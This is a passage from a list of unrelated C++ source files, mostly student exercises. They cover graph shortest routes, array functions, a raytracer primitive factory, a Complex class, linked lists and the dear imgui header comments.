}\n  return false;\n}\n\n///////////////////\n\nvoid PrintShortestRouteTo(Node* destination) {\n  Node* previous = destination;\n  cout << \"Distance from start: \"\n     << destination->distanceFromStart << endl;\n  while (previous) {\n    cout << previous->id << \" \";\n    previous = previous->previous;\n  }\n  cout << endl;\n}\n\n// these two not needed\nvector<Edge*>* AdjacentEdges(vector<Edge*>& Edges, Node* node);\nvoid RemoveEdge(vector<Edge*>& Edges, Edge* edge);\n\nvector<Edge*>* AdjacentEdges(vector<Edge*>& edges, Node* node) {\n  vector<Edge*>* adjacentEdges = new vector<Edge*>();\n\n  const int size = edges.size();\n  for (int i = 0; i < size; ++i) {\n    Edge* edge = edges.at(i);\n    if (edge->node1 == node) {\n      cout << \"adjacent: \" << edge->node2->id << endl;\n      adjacentEdges->push_back(edge);\n    } else if (edge->node2 == node) {\n      cout << \"adjacent: \" << edge->node1->id << endl;\n      adjacentEdges->push_back(edge);\n    }\n  }\n  return adjacentEdges;\n}\n\nvoid RemoveEdge(vector<Edge*>& edges, Edg",
    "//Final Exam Program\n//This program demostrates the concept of passing Arrays as arguments to your functions\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\n//Function Prototypes\nvoid displayarrays(int array1[], int array2[], int SIZE);\nvoid reversearrays(int array1[], int array2[], int SIZE);\nint minimumnum1(int array1[], int SIZE);\nint minimumnum2(int array2[], int SIZE);\nvoid sumarrays(int array1[], int array2[], int SIZE);\ndouble meanarrays1(int array1[], int SIZE);\ndouble meanarrays2(int array2[], int SIZE);\nvoid lessthanfive(int array1[], int SIZE);\nvoid compare_arrays(int array1[], int array2[], int SIZE);\n\n//Main Function\nint main()\n{\n\t//Initalize Array 1, Array 2, and other Variables\n\tconst int SIZE = 10;\n\tint array1[SIZE];\n\tint array2[SIZE];\n\tint minimum1;\n\tint minimum2;\n\tdouble average_array1;\n\tdouble average_array2;\n\n\t//Input values for Array 1\n\tcout << \"Please input \" << SIZE << \" values for the first array:\" << endl;\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\tcin >> array1[i];\n\t\tcout << endl;\n\t}\n\n\t//Input Values for Array 2 (Used Later On)\n\tcout << \"Please input \" << SIZE << \" values for the second array:\" << endl;\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\tcin >> array2[i];\n\t\tcout << endl;\n\t}\n\n\tcout << endl;\n\tcout << \"Now let's review your inputs...\" << endl;\n\t\n\tsystem(\"pause\");\n\n\t//Call display Function\n\tdisplayarrays(array1, array2, SIZE);\n\n\tcout << \"Now let's see these values in reverse order!\" << endl;\n\n\tsystem(\"pause\");\n\n\t//Call reverse display function\n\treversearrays(array1, array2, SIZE);\n\n\tcout << \"Now let's see the lowest value of the two arrays.\" << endl;\n\n\tsystem(\"pause\");\n\t\n\tminimum1 = minimumnum1(array1, SIZE);\n\n\tcout << \"The Smallest value of array one is...\" << endl;\n\n\tsystem(\"pause\");\n\n\tcout << minimum1 << endl;\n\n\tminimum2 = minimumnum2(array2, SIZE);\n\n\tcout << \"The Smallest value of array two is...\" << endl;\n\n\tsystem(\"pause\");\n\n\tcout << minimum2 << endl;\n\n\tcout << endl;\n\n\tcout << \"Now let's add up the sum of the two arrays.\" << endl;\n\n\tsystem(\"pause\");\n\n\tsumarrays(array1, array2, SIZE);\n\n\tcout << \"Now let's find the average of the two arrays.\" << endl;\n\n\tsystem(\"pause\");\n\n\taverage_array1 = meanarrays1(array1, SIZE);\n\n\tcout << \"The average of array one is:\" << endl;\n\tcout << average_array1 << endl;\n\n\taverage_array2 = meanarrays2(array2, SIZE);\n\n\tcout << \"The average of the second array is:\" << endl;\n\tcout << average_array2 << endl;\n\n\tsystem(\"pause\");\n\n\tlessthanfive(array1, SIZE);\n\n\tsystem(\"pause\");\n\n\tcout << \"Now let's compare the two arrays we have created at the beginning!\" << endl;\n\n\tsystem(\"pause\");\n\n\tcompare_arrays(array1, array2, SIZE);\n\t\n\tsystem(\"pause\");\n\n\treturn 0;\n}\n\n\n//Display Array function simply display the values stored in the two arrays.\nvoid displayarrays(int array1[], int array2[], int SIZE)\n{\n\t//Display Values for Array 1\n\tcout << \"Array 1:\" << endl;\n\tsystem(\"pause\");\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\tcout << array1[i] << endl;\n\t}\n\n\t//Display values for Array 2\n\tcout << \"Array 2:\" << endl;\n\tsystem(\"pause\");\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\tcout << array2[i] << endl;\n\t}\n}\n\n//This function works the same as the one above EXCEPT it displays values in reverse order/Backwards.\nvoid reversearrays(int array1[], int array2[], int SIZE)\n{\n\t//Display values of array 1 backwards\n\tcout << \"Array 1:\" << endl;\n\tsystem(\"pause\");\n\tfor (int i = 9; i > 0; i--)\n\t{\n\t\tcout << array1[i] << endl;\n\t}\n\n\t//Display Values for array 2 Backwards\n\tcout << \"Array 2:\" << endl;\n\tsystem(\"pause\");\n\tfor (int i = 9; i > 0; i--)\n\t{\n\t\tcout << array2[i] << endl;\n\t}\n}\n\n//This function determines the lowest value of the First array\nint minimumnum1(int array1[], int SIZE)\n{\n\t//Initialize Variable\n\tint lowest_num1;\n\n\t//find lowest value of array 1\n\tlowest_num1 = array1[0];\n\n\tfor (int i = 1; i < SIZE; i++)\n\t{\n\t\tif (array1[i] < lowest_num1)\n\t\t{\n\t\t\tlowest_num1 = array1[i];\n\t\t}\n\t}\n\n\treturn lowest_num1;\n}\n\n//This function does the same as the one above, but with the second array.\nint minimumnum2(int array2[], int SIZE)\n{\n\t//initialize Variable\n\tint lowest_num2;\n\n\t//find lowest value of array 2\n\tlowest_num2 = array2[0];\n\t\n\tfor (int i = 1; i < SIZE; i++)\n\t{\n\t\tif (array2[i] < lowest_num2)\n\t\t{\n\t\t\tlowest_num2 = array2[i];\n\t\t}\n\t}\n\treturn lowest_num2;\n}\n\n//This function sums up the total of the two arrays\nvoid sumarrays(int array1[], int array2[], int SIZE)\n{\n\t//Initailize Accumulator\n\tint total1 = 0;\n\tint total2 = 0;\n\n\t//Calculate sum of the two arrays together\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\ttotal1 += array1[i];\n\t\ttotal2 += array2[i];\n\t}\n\n\tcout << \"Total of First Array:\" << endl;\n\tcout << total1;\n\tcout << endl;\n\tsystem(\"pause\");\n\tcout << \"Total of second Array:\" << endl;\n\tcout << total2;\n\tsystem(\"pause\");\n}\n\n//This function calculates the Mean (average) of the First array\ndouble meanarrays1(int array1[], int SIZE)\n{\n\t//initialize Variables\n\tint total1 = 0;\n\tdouble average1;\n\n\tfor (int i = 0; i < SIZE; i++)\n\t{\n\t\ttotal1 += array1[i];\n\t}\n\n\taverage1 = total1 / SIZE;\n\n\treturn average1;\n}\n\n//This functi",
    "/*\n** EPITECH PROJECT, 2024\n** B-OOP-400-STG-4-1-raytracer-cedric.martz\n** File description:\n** APrimitive\n*/\n\n#include \"../include/APrimitive.hpp\"\n#include \"../include/sphere.hpp\"\n#include \"../include/plane.hpp\"\n\nAPrimitive::APrimitive()\n{\n}\n\nAPrimitive::~APrimitive()\n{\n}\n\nbool APrimitive::hit(const Ray &ray, Interval rayInterval, HitRecord &record) const\n{\n    return false;\n}\n\nboundingBox APrimitive::applyBoundingBox() const\n{\n    return boundingBox();\n}\n\nstd::shared_ptr<APrimitive> APrimitive::createPrimitive(conf::Primitive *object, std::string material)\n{\n    if (conf::Sphere *obj = dynamic_cast<conf::Sphere *>(object)) {\n        if (material == \"flat\") {\n            auto material = std::make_shared<Flat>(Color(obj->getcolR(),obj->getcolG(),obj->getcolB()));\n            return (std::make_shared<Sphere>(Point3D(obj->getposX(),obj->getposY(),obj->getposZ()), obj->getradius(), material));\n        }\n        if (material == \"glass\") {\n            auto material = std::make_shared<Glass>(obj->getcolR());\n            return (std::make_shared<Sphere>(Point3D(obj->getposX(),obj->getposY(),obj->getposZ()),obj->getradius(), material));\n        }\n        if (material == \"metal\") {\n            auto material = std::make_shared<Metal>(Color(obj->getcolR(),obj->getcolG(),obj->getcolB()), 0.0);\n            return (std::make_shared<Sphere>(Point3D(obj->getposX(),obj->getposY(),obj->getposZ()), obj->getradius(), material));\n        }\n        if (material == \"light\") {\n            auto material = std::make_shared<Light>(Color(obj->getcolR(),obj->getcolG(),obj->getcolB()));\n            return (std::make_shared<Sphere>(Point3D(obj->getposX(),obj->getposY(),obj->getposZ()), obj->getradius(), material));\n        }\n    }\n    if (conf::Plane *obj = dynamic_cast<conf::Plane *>(object)) {\n        if (material == \"flat\") {\n            auto material = std::make_shared<Flat>(Color(obj->getCol()[0],obj->getCol()[1],obj->getCol()[2]));\n            return (std::make_shared<Plane>(Point3D(obj->getQ()[0], obj->getQ()[1], obj->getQ()[2]),\n            Vector3D(obj->getV()[0], obj->getV()[1], obj->getV()[2]),\n            Vector3D(obj->getU()[0], obj->getU()[1], obj->getU()[2]), material));\n        }\n        if (material == \"light\") {\n            auto material = std::make_shared<Light>(Color(obj->getCol()[0],obj->getCol()[1],obj->getCol()[2]));\n            return (std::make_shared<Plane>(Point3D(obj->getQ()[0], obj->getQ()[1], obj->getQ()[2]),\n            Vector3D(obj->getV()[0], obj->getV()[1], obj->getV()[2]),\n            Vector3D(obj->getU()[0], obj->getU()[1], obj->getU()[2]), material));\n        }\n    }\n    return nullptr;\n}\n",
    "/*\r\nCreate a class Complex having two int type variable named real & img\r\ndenoting real and imaginary part respectively of a complex number.\r\nOverload +, - , == operator to add, to subtract and to compare two complex\r\nnumbers being denoted by the two complex type objects\r\n*/\r\n#include <iostream>\r\nusing namespace std;\r\nclass Complex\r\n{\r\n    int real, img;\r\n\r\npublic:\r\n    Complex(int r, int i)\r\n    {\r\n        real = r;\r\n        img = i;\r\n    }\r\n    Complex operator+(Complex c2)\r\n    {\r\n        return Complex(real + c2.real, img + c2.img);\r\n    }\r\n    Complex operator-(Complex c2)\r\n    {\r\n        return Complex(real - c2.real, img - c2.img);\r\n    }\r\n     bool operator==(Complex c2) {\r\n        return (real == c2.real) && (img == c2.img);\r\n    }\r\n    void display()\r\n    {\r\n        cout << real << (img<0?\" - \":\" + \") << (img<0?-img:img)<< \"i\" << endl;\r\n    }\r\n};\r\nint main()\r\n{\r\n    Complex c1(3, 4);\r\n    Complex c2(1, 7);\r\n    Complex c3 = c1 + c2;\r\n    c3.display();\r\n    c3 = c1 - c2;\r\n    c3.display();\r\n    if (c1 == c2) {\r\n        cout << \"c1 and c2 are equal\" << endl;\r\n    } else {\r\n        cout << \"c1 and c2 are not equal\" << endl;\r\n    }\r\n}\r\n",
    "// dear imgui, v1.91.2 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\n// - Homepage ................... https://github.com/ocornut/imgui\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\n// - Gallery .................... https://github.com/ocornut/imgui/issues?q=label%3Agallery (please post your screenshots/video there!)\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO, ImGuiPlatformIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ID STACK\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUM",
    "#include <iostream> \r\nusing namespace std;\r\n\r\nstruct jasajoki {\r\n    string nama_joki;\r\n    string tipe_joki; \r\n    float harga;\r\n    jasajoki* next; \r\n};\r\n\r\nvoid tambahjoki(jasajoki** head) {\r\n    jasajoki* jokiBaru = new jasajoki; \r\n    \r\n    cin.ignore(); \r\n    cout << \"Masukkan nama joki: \";\r\n    getline(cin, jokiBaru->nama_joki); \r\n    \r\n    cout << \"Masukkan tipe joki (Joki Explore/Joki Material): \";\r\n    getline(cin, jokiBaru->tipe_joki);\r\n    cout << \"Masukkan harga: \";\r\n    while(!(cin >> jokiBaru->harga)) { \r\n        cout << \"Input harga tidak valid. Masukkan harga lagi: \";\r\n        cin.clear();  \r\n        cin.ignore(); \r\n    }\r\n    \r\n    jokiBaru->next = *head;  \r\n    *head = jokiBaru;  \r\n    \r\n    cout << \"joki berhasil ditambahkan!\\n\" << endl;\r\n}\r\n\r\nvoid tampilkanjoki(jasajoki* head) {\r\n    if (head == nullptr) {\r\n        cout << \"Belum ada data joki.\" << endl;\r\n        return;\r\n    }\r\n\r\n    jasajoki* current = head;\r\n    cout << \"\\nDaftar Jasa Joki Genshin Impact:\\n\";\r\n    while (current != nullptr) {\r\n        cout << \"Nama joki: \" << current->nama_joki << endl;\r\n        cout << \"Tipe Joki: \" << current->tipe_joki << endl;\r\n        cout << \"Harga: \" << current->harga << endl;\r\n        cout << \"----------------------\" << endl;\r\n        current = current->next;\r\n    }\r\n}\r\n\r\nvoid updatejoki(jasajoki* head) {\r\n    if (head == nullptr) {\r\n        cout << \"Tidak ada data untuk di-update.\" << endl;\r\n        return;\r\n    }\r\n\r\n    string nama;\r\n    cin.ignore();\r\n    cout << \"Masukkan nama paket joki yang ingin di-update: \";\r\n    getline(cin, nama);\r\n\r\n    jasajoki* current = head;\r\n    while (current != nullptr) {\r\n        if (current->nama_joki == nama) {\r\n            cout << \"Masukkan nama joki baru: \";\r\n            getline(cin, current->nama_joki);\r\n            cout << \"Masukkan tipe joki baru: \";\r\n            getline(cin, current->tipe_joki);\r\n            cout << \"Masukkan harga baru: \";\r\n            while(!(cin >> current->harga)) {\r\n                cout << \"Input harga tidak valid. Masukkan harga lagi: \";\r\n                cin.clear();\r\n                cin.ignore();\r\n            }\r\n            cout << \"Data joki berhasil di-update!\\n\" << endl;\r\n            return;\r\n        }\r\n        current = current->next;\r\n    }\r\n    cout << \"joki dengan nama tersebut tidak ditemukan.\" << endl;\r\n}\r\n\r\nvoid hapusjoki(jasajoki** head) {\r\n    if (*head == nullptr) {\r\n        cout << \"Tidak ada data untuk dihapus.\" << endl;\r\n        return;\r\n    }\r\n\r\n    string nama;\r\n    cin.ignore();\r\n    cout << \"Masukkan nama joki yang ingin dihapus: \";\r\n    getline(cin, nama);\r\n\r\n    jasajoki* current = *head;\r\n    jasajoki* prev = nullptr;\r\n\r\n    if (current != nullptr && current->nama_joki == nama) {\r\n        *head = current->next;\r\n        delete current;\r\n        cout << \"joki berhasil dihapus!\\n\" << endl;\r\n        return;\r\n    }\r\n\r\n    while (current != nullptr && current->nama_joki != nama) {\r\n        prev = current;\r\n        current = current->next;\r\n    }\r\n\r\n    if (current == nullptr) {\r\n        cout << \"joki dengan nama tersebut tidak ditemukan.\" << endl;\r\n        return;\r\n    }\r\n\r\n    prev->next = current->next;\r\n    delete current;\r\n    cout << \"joki berhasil dihapus!\\n\" << endl;\r\n}\r\n\r\nint main() {\r\n    system(\"cls\");\r\n    jasajoki* head = nullptr;\r\n    int pilihan;\r\n    system(\"cls\");\r\n    do {\r\n        cout << \"\\n===Jasa Joki Genshin Impact ===\\n\";\r\n        cout << \"1. Tambah joki\\n\";\r\n        cout << \"2. Tampilkan Semua joki\\n\";\r\n        cout << \"3. Update joki\\n\";\r\n        cout << \"4. Hapus joki\\n\";\r\n        cout << \"5. Keluar\\n\";\r\n        cout << \"Pilih menu: \";\r\n        cin >> pilihan;\r\n        system(\"cls\");\r\n        \r\n        switch (pilihan) {\r\n            case 1:\r\n                cout << \"Tambah Joki\\n\";\r\n                tambahjoki(&head);\r\n                break;\r\n            case 2:\r\n                cout << \"Tampilkan Semua Joki\\n\";\r\n                tampilkanjoki(head);\r\n                break;\r\n            case 3:\r\n                cout << \"Update joki\\n\";\r\n                tampilkanjoki(head);\r\n                updatejoki(head);\r\n                break;\r\n            case 4:\r\n                cout << \"Hapus joki\\n\";\r\n                tampilkanjoki(head);\r\n                hapusjoki(&head);\r\n                break;\r\n            case 5:\r\n                cout << \"Program keluar.\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Pilihan tidak valid!\" << endl;\r\n        }\r\n    } while (pilihan != 5);\r\n    \r\n    return 0;\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <initializer_list>\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n#define TAB \"\\t\"\n#define delimiter \"\\n----------------------------\\n\"\n\nclass List\n{\n\tclass Element\n\t{\n\t\tint Data;\n\t\tElement* pNext;\n\t\tElement* pPrev;\n\n\tpublic:\n\t\tElement(int Data, Element* pNext = nullptr, Element* pPrev = nullptr)\n\t\t\t:Data(Data), pNext(pNext), pPrev(pPrev)\n\t\t{\n\t\t\tcout << \"EConstructor:\\t\" << this << endl;\n\t\t}\n\t\t~Element()\n\t\t{\n\t\t\tcout << \"EDestructor:\\t\" << this << endl;\n\t\t}\n\t\tfriend class List;\n\t}*Head, * Tail;\t//\u041e\u0431\u044a\u044f\u0432\u043b\u044f\u0435\u043c \u0434\u0432\u0430 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u043d\u0430 \u043e\u0431\u044a\u0435\u043a\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430 'Element' \u043d\u0435\u043f\u043e\u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0435\u043d\u043d\u043e \u043f\u043e\u0441\u043b\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u044f \u043a\u043b\u0430\u0441\u0441\u0430;\n\t\n\tsize_t size;\t//\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0441\u043f\u0438\u0441\u043a\u0430\n\n\n\tclass ConstBaseIterator\n\t{\n\tprotected:\n\t\tElement* Temp;\n\n\tpublic:\n\t\tConstBaseIterator(Element* Temp) :Temp(Temp) {}\n\t\t~ConstBaseIterator() {}\n\n\t\tbool operator==(const ConstBaseIterator& other)const\n\t\t{\n\t\t\treturn this->Temp == other.Temp;\n\t\t}\n\t\tbool operator!=(const ConstBaseIterator& other)const\n\t\t{\n\t\t\treturn this->Temp != other.Temp;\n\t\t}\n\n\t\tint operator*()const\n\t\t{\n\t\t\treturn Temp->Data;\n\t\t}\n\t};\n\n\npublic:\n\n\n\tclass ConstIterator :public ConstBaseIterator\n\t{\n\tpublic:\n\t\tConstIterator(Element* Temp) :ConstBaseIterator(Temp) {}\n\t\t~ConstIterator() {}\n\n\t\tConstIterator& operator++()\t\t//Prefix increment\n\t\t{\n\t\t\tTemp = Temp->pNext;\n\t\t\treturn *this;\n\t\t}\n\t\tConstIterator operator++(int)\t//Postfix increment\n\t\t{\n\t\t\tConstIterator old = *this;\n\t\t\tTemp = Temp->pNext;\n\t\t\treturn old;\n\t\t}\n\t\tConstIterator& operator--()\n\t\t{\n\t\t\tTemp = Temp->pPrev;\n\t\t\treturn *this;\n\t\t}\n\t\tConstIterator operator--(int)\n\t\t{\n\t\t\tConstIterator old = Temp;\n\t\t\tTemp = Temp->pPrev;\n\t\t\treturn old;\n\t\t}\n\t};\n\n\n\tclass ConstReverseIterator :public ConstBaseIterator\n\t{\n\tpublic:\n\t\tConstReverseIterator(Element* Temp) :ConstBaseIterator(Temp) {}\n\t\t~ConstReverseIterator() {}\n\n\t\tConstReverseIterator& operator++()\n\t\t{\n\t\t\tTemp = Temp->pPrev;\n\t\t\treturn *this;\n\t\t}\n\t\tConstReverseIterator operator++(int)\n\t\t{\n\t\t\tConstReverseIterator old = *this;\n\t\t\tTemp = Temp->pPrev;\n\t\t\treturn old;\n\t\t}\n\t\tConstReverseIterator& operator--()\n\t\t{\n\t\t\tTemp = Temp->pNext;\n\t\t\treturn *this;\n\t\t}\n\t\tConstReverseIterator operator--(int)\n\t\t{\n\t\t\tConstReverseIterator old = *this;\n\t\t\tTemp = Temp->pNext;\n\t\t\treturn old;\n\t\t}\n\t};\n\n\n\tclass Iterator :public ConstIterator\n\t{\n\tpublic:\n\t\tIterator(Element* Temp) :ConstIterator(Temp) {}\n\t\t~Iterator() {}\n\n\t\tint& operator*()\n\t\t{\n\t\t\treturn Temp->Data;\n\t\t}\n\t};\n\n\n\tclass ReverseIterator :public ConstReverseIterator\n\t{\n\tpublic:\n\t\tReverseIterator(Element* Temp) :ConstReverseIterator(Temp) {}\n\t\t~ReverseIterator() {}\n\n\t\tint& operator*()\n\t\t{\n\t\t\treturn Temp->Data;\n\t\t}\n\t};\n\n\n\tConstIterator begin()const\n\t{\n\t\treturn Head;\n\t}\n\tConstIterator end()const\n\t{\n\t\treturn nullptr;\n\t}\n\tIterator begin()\n\t{\n\t\treturn Head;\n\t}\n\tIterator end()\n\t{\n\t\treturn nullptr;\n\t}\n\n\tConstReverseIterator rbegin()const\n\t{\n\t\treturn Tail;\n\t}\n\tConstReverseIterator rend()const\n\t{\n\t\treturn nullptr;\n\t}\n\tReverseIterator rbegin()\n\t{\n\t\treturn Tail;\n\t}\n\tReverseIterator rend()\n\t{\n\t\treturn nullptr;\n\t}\n\n\t// constructor and destructor List\n\tList()\n\t{\n\t\t//\u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0441\u043e\u0437\u0434\u0430\u0435\u0442 \u043f\u0443\u0441\u0442\u043e\u0439 \u0441\u043f\u0438\u0441\u043e\u043a\n\t\tHead = Tail = nullptr;\n\t\tsize = 0;\n\t\tcout << \"LConstrutor:\\t\" << this << endl;\n\t}\n\tList(const std::initializer_list<int>& il) :List()\n\t{\n\t\t//begin() - \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0438\u0442\u0435\u0440\u0430\u0442\u043e\u0440 \u043d\u0430 \u043d\u0430\u0447\u0430\u043b\u043e \u043a\u043e\u043d\u0442\u0435\u0439\u043d\u0435\u0440\u0430.\n\t\t//end()   - \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0438\u0442\u0435\u0440\u0430\u0442\u043e\u0440 \u043d\u0430 \u043a\u043e\u043d\u0435\u0446  \u043a\u043e\u043d\u0442\u0435\u0439\u043d\u0435\u0440\u0430.\n\t\t//\u0418\u0442\u0435\u0440\u0430\u0442\u043e\u0440 - \u044d\u0442\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c, \u043f\u0440\u0438 \u043f\u043e\u043c\u043e\u0449\u0438 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0434\u043e\u0441\u0442\u0443\u043f \u043a \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u0434\u0430\u043d\u043d\u044b\u0445.\n\t\tcout << typeid(il.begin()).name() << endl;\n\t\tfor (int const* it = il.begin(); it != il.end(); it++)\n\t\t\tpush_back(*it);\n\t}\n\tList(const List& other) :List()\t//\u0411\u0435\u0437 \u0434\u0435\u043b\u0435\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u043c\u043e\u0436\u0435\u0442 \u043f\u0430\u0434\u0430\u0442\u044c\n\t{\n\t\t*this = other;\n\t\tcout << \"LCopyConstructor:\" << this << endl;\n\t}\n\tList(List&& other) :List()\n\t{\n\t\t*this = std::move(other);\t//\u042f\u0432\u043d\u044b\u0439 \u0432\u044b\u0437\u043e\u0432 MoveAssignment\n\t}\n\t~List()\n\t{\n\t\t//while(Head) pop_front();\n\t\twhile (Tail) pop_back();\n\t\tcout << \"LDestrutor:\\t\" << this << endl;\n\t}\n\n\t// Operators:\n\tList& operator=(const List& other)\n\t{\n\t\tif (this == &other)return *this;\n\t\twhile (Head)pop_front();\n\n\t\t//Deep copy - \u041f\u043e\u0431\u0438\u0442\u043e\u0432\u043e\u0435 \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435:\n\t\tfor (Element* Temp = other.Head; Temp; Temp = Temp->pNext)\n\t\t\tpush_back(Temp->Data);\n\t\tcout << \"LCopyAssignment:\\t\" << this << endl;\n\t\treturn *this;\n\t}\n\tList& operator=(List&& other)\n\t{\n\t\tif (this == &other)return *this;\n\t\twhile (Head) pop_front();\n\n\t\t//Shallow copy - \u041f\u043e\u0432\u0435\u0440\u0445\u043d\u043e\u0441\u0442\u043d\u043e\u0435 \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435:\n\t\tthis->Head = other.Head;\n\t\tthis->Tail = other.Tail;\n\t\tthis->size = other.size;\n\n\t\t//\u041e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u043d\u0443\u0436\u043d\u043e \u043e\u0431\u043d\u0443\u043b\u0438\u0442\u044c 'other':\n\t\tother.Head = other.Tail = nullptr;\n\t\tother.size = 0;\n\n\t\tcout << \"LMoveAssignment:\\t\" << this << endl;\n\t}\n\n\t// Adding elements:\n\tvoid push_front(int Data)\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)Head = Tail = new Element(Data);\n\t\telse\n\t\t{\n\t\t\tHead = Head->pPrev = new Element(Data, Head);\n\t\t}\n\t\tsize++;\n\t}\n\tvoid push_back(int Data)\n\t{\n\t\tif (Head == nullptr && Tail == nullptr)return push_front(Data);\n\t\tTail = Tail->pNext = new Element(Data, nullptr, Tail);\n\t\tsize++;\n\t}\n\tvoid insert(int Data, int Index)\n\t",
